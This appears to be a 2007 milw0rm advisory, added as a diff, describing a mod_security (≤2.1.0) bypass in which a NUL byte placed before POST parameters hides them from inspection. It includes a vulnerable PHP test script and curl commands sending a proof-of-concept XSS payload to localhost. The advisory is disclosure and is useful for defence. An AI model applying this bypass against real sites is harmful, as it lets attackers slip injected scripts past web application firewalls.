@@ -1,0 +1,48 @@
+mod_security <= 2.1.0 (ASCIIZ byte) POST Rules Bypass Vulnerability 
+http://www.php-security.org/MOPB/BONUS-12-2007.html 
+
+Affected is mod_security <= 2.1.0 Detailed information 
+
+Detailed information
+
+When mod_security receives a request it parses it into web application 
+parameters in a way it believes is correct. Because the way it parses 
+the incoming data follows the rules defined in RFCs and not the reality 
+of how the HTTP request parsers are implemented in Perl, Python, Java, 
+PHP there are a number of bypass vulnerabilities when the RFC and 
+reality mismatch. 
+
+One of the these differences is the way ASCIIZ bytes are handled when 
+they occur in POST data of the application/x-www-form-urlencoded 
+content-type. Because mod_security handles POST data of this kind as a C 
+string it does not touch anything behind the first ASCIIZ byte because 
+in the eyes of mod_security this is the end of the data. 
+
+Unfortunately for mod_security this is not how the HTTP parsers of the 
+different script languages handle this situation. Most script languages 
+(Perl, Python, ...) just ignore the ASCIIZ byte and parse the data as if 
+it is legal. Since PHP 5.2.0 this also applies to PHP. Proof of concept, 
+exploit or instructions to reproduce 
+
+<?php if (isset($_POST['var']) echo($_POST['var']); ?> 
+
+Now call it with a command like 
+
+$ echo -e "&var=<script>alert(/xss/);</script>" > postdata 
+$ curl http://localhost/test.php --data-binary @postdata -A HarmlessUserAgent 
+<script>alert(/xss/);</script> 
+
+The example should not be blocked (because this is the default 
+configuration) but in your error.log you will find a line saying that a 
+possible XSS attack was detected. 
+
+Now try the same with a ASCIIZ byte embedded. 
+
+$ echo -e "\000&var=<script>alert(/xss/);</script>" > postdata 
+$ curl http://localhost/test.php --data-binary @postdata -A HarmlessUserAgent 
+<script>alert(/xss/);</script> 
+
+This time there should be no log message in your error.log, because 
+mod_security cannot see the var parameter behind the ASCIIZ byte.
+
+# milw0rm.com [2007-03-07]
